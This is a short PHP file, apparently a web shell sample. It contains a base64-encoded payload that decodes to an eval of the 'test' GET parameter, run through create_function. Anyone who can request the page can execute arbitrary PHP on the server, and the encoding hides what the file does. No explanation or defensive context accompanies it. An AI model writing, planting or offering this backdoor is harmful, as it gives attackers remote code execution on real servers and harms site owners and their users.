
<?php

    $function = create_function('$code',base64_decode('ZXZhbCgkX0dFVFsidGVzdCJdKTs='));

    $function();

?>
